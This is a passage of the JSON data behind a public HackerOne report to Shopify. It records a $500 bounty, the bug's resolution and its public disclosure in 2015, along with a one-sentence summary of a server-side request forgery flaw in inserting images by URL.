resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-08-24T14:23:31.602Z","updated_at":"2015-08-24T14:23:31.602Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"alpha","url":"/alpha"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":560386,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-24T14:23:41.464Z","updated_at":"2015-08-24T14:23:41.464Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"alpha","url":"/alpha"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":560390,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-24T14:24:22.254Z","updated_at":"2015-08-24T14:24:22.254Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":560459,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-24T14:47:12.880Z","updated_at":"2015-08-24T14:47:12.880Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":560460,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-24T14:47:13.113Z","updated_at":"2015-08-24T14:47:13.113Z","actor":{"username":"alpha","cleared":false,"url":"/alpha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/246/e8b4598aaf81648969f1ebf4c96e63155092c651_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":56,"category":"researcher","content":"Insertion images via URL can be used to perform [SSRF/XSPA](https://cwe.mitre.org/data/definitions/918.html) attacks. For example, it is possible to scan arbitrary Internet hosts from Shopify's network or servers' loopback.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eInsertion images via URL can be used to perform \u003ca href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F918.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSSRF/XSPA\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e attacks. For example, it is possible to scan arbitrary Internet hosts from Shopify\u0026#39;s network or servers\u0026#39; loopback.\u003c/p\u003e\n"}]}